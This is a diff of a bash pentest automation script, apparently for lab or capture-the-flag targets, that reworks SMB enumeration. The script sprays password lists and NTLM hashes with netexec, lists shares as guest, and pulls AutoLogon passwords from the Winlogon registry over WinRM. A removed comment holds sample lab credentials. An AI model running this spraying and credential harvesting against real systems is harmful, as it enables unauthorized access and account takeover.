@@ -308,23 +308,24 @@ for port in $open_ports; do
             ;;
         139)
             # https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
-       		if [ ! -s "$enumx_dir/creds" ] && [ ! -s "$enumx_dir/hcreds" ]; then
+       		if [ ! -s "$enumx_dir/creds" ]; then      			
 	       		spray=$(netexec smb "$target" --port "$port" -u "$enumx_dir/usernames" -p "$enumx_dir/passwords" --continue-on-success | grep -viE '\\:' 2>/dev/null)
 	       		echo "$spray" | grep -iE '[+]' | awk '{print $6}' | cut -d'\' -f2- | tee -a "$enumx_dir/creds"
 		        sort -u "$enumx_dir"/creds -o "$enumx_dir"/creds 2>/dev/null
+		    fi
+		    if [ ! -s "$enumx_dir/hcreds" ]; then
 				hspray=$(netexec smb "$target" --port "$port" -u "$enumx_dir/usernames" -H "$enumx_dir/hashes" --continue-on-success | sed 's/.*\\//1' | grep -viE 'guest|_failure|domain:|invalid' 2>/dev/null)
 	       		echo "$hspray" | tee -a "$enumx_dir/hcreds"
 				sort -u "$enumx_dir"/hcreds -o "$enumx_dir"/hcreds 2>/dev/null
-				if [ -n "$spray" ]; then
-			      	while IFS= read -r user; do
-			      		shares=$(netexec smb "$target" --port "$port" -u "$user" -p "" --shares | tr -d '\0')
-			      		echo "$shares"
-			      		echo "$shares" | grep -iE 'READ|WRITE' | sed -E 's/(.*) (READ|WRITE).*/\1/' | awk '{for(i=5;i<=NF;i++) printf $i (i==NF ? "" : " "); print ""}' >> "$enumx_dir/shares"
-						sort -u "$enumx_dir/shares" -o "$enumx_dir/shares" 2>/dev/null
-			        	smb_enum "$target" "$port" "anonymous" "$enumx_dir" "$user"
-		        	done < "$enumx_dir/usernames"
-		        fi
-			fi       		
+			fi
+			netexec smb "$target" --port "$port" -u "guest" -p "" --shares | tr -d '\0'
+          	#while IFS= read -r user; do
+          	#	shares=$(netexec smb "$target" --port "$port" -u "$user" -p "" --shares | tr -d '\0')
+          	#	echo "$shares"
+          	#	echo "$shares" | grep -iE 'READ|WRITE' | sed -E 's/(.*) (READ|WRITE).*/\1/' | awk '{for(i=5;i<=NF;i++) printf $i (i==NF ? "" : " "); print ""}' >> "$enumx_dir/shares"
+			#	sort -u "$enumx_dir/shares" -o "$enumx_dir/shares" 2>/dev/null
+            #	smb_enum "$target" "$port" "anonymous" "$enumx_dir" "$user"
+        	#done < "$enumx_dir/usernames"
 			if [ -s "$enumx_dir/creds" ]; then
 				ph='-p'
 				file='creds'
@@ -382,22 +383,24 @@ for port in $open_ports; do
             ;;
         445)
             # https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
-       		if [ ! -s "$enumx_dir/creds" ] && [ ! -s "$enumx_dir/hcreds" ]; then
+       		if [ ! -s "$enumx_dir/creds" ]; then      			
 	       		spray=$(netexec smb "$target" --port "$port" -u "$enumx_dir/usernames" -p "$enumx_dir/passwords" --continue-on-success | grep -viE '\\:' 2>/dev/null)
 	       		echo "$spray" | grep -iE '[+]' | awk '{print $6}' | cut -d'\' -f2- | tee -a "$enumx_dir/creds"
 		        sort -u "$enumx_dir"/creds -o "$enumx_dir"/creds 2>/dev/null
+		    fi
+		    if [ ! -s "$enumx_dir/hcreds" ]; then
 				hspray=$(netexec smb "$target" --port "$port" -u "$enumx_dir/usernames" -H "$enumx_dir/hashes" --continue-on-success | sed 's/.*\\//1' | grep -viE 'guest|_failure|domain:|invalid' 2>/dev/null)
 	       		echo "$hspray" | tee -a "$enumx_dir/hcreds"
 				sort -u "$enumx_dir"/hcreds -o "$enumx_dir"/hcreds 2>/dev/null
-				netexec smb "$target" --port "$port" -u "guest" -p "" --shares | tr -d '\0'
-	          	#while IFS= read -r user; do
-	          	#	shares=$(netexec smb "$target" --port "$port" -u "$user" -p "" --shares | tr -d '\0')
-	          	#	echo "$shares"
-	          	#	echo "$shares" | grep -iE 'READ|WRITE' | sed -E 's/(.*) (READ|WRITE).*/\1/' | awk '{for(i=5;i<=NF;i++) printf $i (i==NF ? "" : " "); print ""}' >> "$enumx_dir/shares"
-				#	sort -u "$enumx_dir/shares" -o "$enumx_dir/shares" 2>/dev/null
-	            #	smb_enum "$target" "$port" "anonymous" "$enumx_dir" "$user"
-            	#done < "$enumx_dir/usernames"
-			fi       		
+			fi
+			netexec smb "$target" --port "$port" -u "guest" -p "" --shares | tr -d '\0'
+          	#while IFS= read -r user; do
+          	#	shares=$(netexec smb "$target" --port "$port" -u "$user" -p "" --shares | tr -d '\0')
+          	#	echo "$shares"
+          	#	echo "$shares" | grep -iE 'READ|WRITE' | sed -E 's/(.*) (READ|WRITE).*/\1/' | awk '{for(i=5;i<=NF;i++) printf $i (i==NF ? "" : " "); print ""}' >> "$enumx_dir/shares"
+			#	sort -u "$enumx_dir/shares" -o "$enumx_dir/shares" 2>/dev/null
+            #	smb_enum "$target" "$port" "anonymous" "$enumx_dir" "$user"
+        	#done < "$enumx_dir/usernames"
 			if [ -s "$enumx_dir/creds" ]; then
 				ph='-p'
 				file='creds'
@@ -527,10 +530,6 @@ for port in $open_ports; do
             while IFS= read -r cred; do
                 read credu credp <<< $(echo "$cred" | sed 's/:/ /')
                 if [ -n "$credp" ]; then
-                	echo "AutoLogon credentials found!"
-#    				echo "DefaultDomainName             :  EGOTISTICALBANK"
-#    				echo "DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager"
-#    				echo "DefaultPassword               :  Moneymakestheworldgoround!"
                 	nxc winrm "$target" -u "$credu" -p "$credp" -X 'Get-Item -Path "HKLM:\software\microsoft\windows nt\currentversion\winlogon"' | grep -iE 'DefaultPassword|' | sed 's/.*: //' | tee -a "$enumx_dir/passwords"
                 fi
             done < "$enumx_dir/creds"
